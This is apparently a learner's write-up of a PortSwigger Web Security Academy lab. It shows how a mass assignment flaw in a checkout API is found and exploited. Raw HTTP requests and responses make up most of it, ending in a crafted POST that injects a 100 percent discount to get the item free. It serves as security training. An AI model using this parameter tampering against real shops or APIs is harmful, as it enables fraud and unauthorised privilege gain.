# Lab - 03 : Exploiting a mass assignment vulnerability

Topic : Exploiting a mass assignment vulnerability

Concept:  There are sometimes some parameters which are default set to most variables. Such as there might be a parameter like `isAdmin` which might be false set to most of the variables, if a patch or put requests let us update this variable then we can gain admin privilege. For this we have to know how to find these vulnerability.

End Goal : Exploiting a mass assignment vulnerability to buy a **Lightweight l33t Leather Jacket.**

Analysis : 

- Reconned the whole app for the api usage and found the request where the api was called.
- The found request → same URL but different METHOD
- First request :
    
    ```
    GET /api/checkout HTTP/2
    Host: 0a88005b03947edc82a08ee50046001b.web-security-academy.net
    Cookie: session=RYcg7fatpvWSV8CzsMa1ZqbiuJDb0nTw
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://0a88005b03947edc82a08ee50046001b.web-security-academy.net/cart
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Priority: u=4
    Te: trailers
    ```
    
    - Response
    
    ```json
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    X-Content-Type-Options: nosniff
    X-Frame-Options: SAMEORIGIN
    Content-Length: 153
    
    {"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
    ```
    
- 2nd Request

```json
POST /api/checkout HTTP/2
Host: 0a88005b03947edc82a08ee50046001b.web-security-academy.net
Cookie: session=RYcg7fatpvWSV8CzsMa1ZqbiuJDb0nTw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a88005b03947edc82a08ee50046001b.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 53
Origin: https://0a88005b03947edc82a08ee50046001b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"chosen_products":[{"product_id":"1","quantity":1}]}
```

- Response
    
    ```json
    HTTP/2 201 Created
    Location: /cart?err=INSUFFICIENT_FUNDS
    X-Frame-Options: SAMEORIGIN
    Content-Length: 0
    ```
    
- Let’s check options for this request
- Here we can compare the variables from the get request with the post request
- We see that a lot of variables are not given in the post request. Let us fudge them and send along with the post request. If it takes it input then, it works.

```json
Total parameters : 
{
	"chosen_discount":{"percentage":0},
	"chosen_products":[
		{
		"product_id":"1",
		"name":"Lightweight \"l33t\" Leather Jacket",
		"quantity":1,
		"item_price":133700
		}
	]
}
```

```json
Crafted parameters : 

{
"chosen_products":
	[
		{"product_id":"1","quantity":1}
	]
}
```

- The item price parameter was unfuzzable and did not have any effect. So, i looked at the discount percentage parameter and put that to 100 and it worked.
- Final request :

```json
POST /api/checkout HTTP/2
Host: 0aa7001503a95bd180b15824000b00e8.web-security-academy.net
Cookie: session=9Gl5Zwd6MhHYbOlBZr2YO27kNdhMFXIt
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa7001503a95bd180b15824000b00e8.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 90
Origin: https://0aa7001503a95bd180b15824000b00e8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":3}]}
```

- This solves the lab